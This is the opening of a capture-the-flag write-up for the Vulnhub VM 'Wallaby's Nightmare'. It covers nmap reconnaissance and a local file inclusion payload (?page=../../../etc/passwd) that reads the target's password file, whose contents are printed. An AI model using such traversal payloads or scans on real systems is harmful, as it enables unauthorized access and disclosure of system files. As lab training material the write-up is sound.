Wallaby's: Nightmare (1.0.2)
============================

Source: https://www.vulnhub.com/entry/wallabys-nightmare-102,176/

* Name: HackDay: Albania
* Released: 22 Dec 2016
* Author: Waldo
* Series: Wallaby's

Recon, Recon, Recon
-------------------

This VM was absolutely not connected to my network -- I set it on its own VLAN. As should you if you run any of these Vulnhub exercises.
I started by running a ping scan across my local `/16` to see what was open.

```
nmap -sn 192.168.0.0/16
```

That came up with 2 results for the VM:

```
map scan report for 192.168.x.x
Host is up (0.00040s latency).
MAC Address: 00:0C:29:6B:EE:FA (VMware)
Nmap scan report for 192.168.x.x
Host is up (0.00038s latency).
MAC Address: 00:0C:29:6B:EE:FA (VMware)
```

Well (alright)x3, we have our 2 IPs. Time for a bit of a juicier `nmap`:

```nmap -sV -A --open -vv -p1-65535 $TARGETIPS

[insert brevity here]

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6e:07:fc:70:20:98:f8:46:e4:8d:2e:ca:39:22:c7:be (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDRXjkewNllkNLo46qiVKISIdysX+C//dfiL0yrAphV9jJg7ETXmLIcfKGQIuRVWXRPm5LgX1OE4LP4wmc5qWbCrI9HOZNMDDuZZsJ7hsHhDPVfu9J0aGoj69vPo7FCZlNWd+371cUiI0qmUeOGZGfAmZotGPkW9r6lom2ww6JphrtwpmlyI+pQk2x1qZR4ZnCIl+XmgFyGHEhim5ALMplxQP8qjnxjncr90xYSByjtQjlvURlemFjjbvVpPhX+BzsMAsXO16ywClLoig0dU39sSBbCSkgmryJYyLfkSWVO9KV6HPEXrVVxnHmUPwi19xGBiq9mxUbmPIza9r0BEofl
|   256 99:46:05:e7:c2:ba:ce:06:c4:47:c8:4f:9f:58:4c:86 (ECDSA)
|_ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBE91a97Hjo/onlxZBy2uFVZ5oTYZcVW2ivqzxdbF0EANVVX5asJJWv3jnb0NQuZY0LqUEs3cObmDVrKETtWmDfw=
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Wallaby's Server
```

Both IPs have SSH and Apache 2.4.18 open, and the server looks to be Ubuntu.

App(le) Picking
---------------

Let's check out this web app! It asked me to create a username, and because I love FFXIV so much, I chose `y4nd3r3_ro3`. Once registered, it takes me to a URL with this format:

> http://192.168.x.x/?page=home

The "registration" page suggested fuzzing is the way to go, and I do love fuzzing. With a URL format like that, I tried the first thing that came to mind: LFI (Local File Inclusion). Since it's an Ubuntu server, I stuck with the standard `/etc/passwd` test...

> http://192.168.x.x/?page=../../../etc/passwd

...And it worked! 


```root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin syslog:x:104:108::/home/syslog:/bin/false _apt:x:105:65534::/nonexistent:/bin/false uuidd:x:107:111::/run/uuidd:/bin/false walfin:x:1000:1000:walfin,,,:/home/walfin:/bin/bash sshd:x:108:65534::/var/run/sshd:/usr/sbin/nologin mysql:x:109:117:MySQL Server,,,:/nonexistent:/bin/false steven?:x:1001:1001::/home/steven?:/bin/bash ircd:x:1003:1003:,,,:/home/ircd:/bin/bash
```

There are users named `steven?` and `walfin` in there, also an irc daemon. Both first users listed have `/bin/bash` enabled.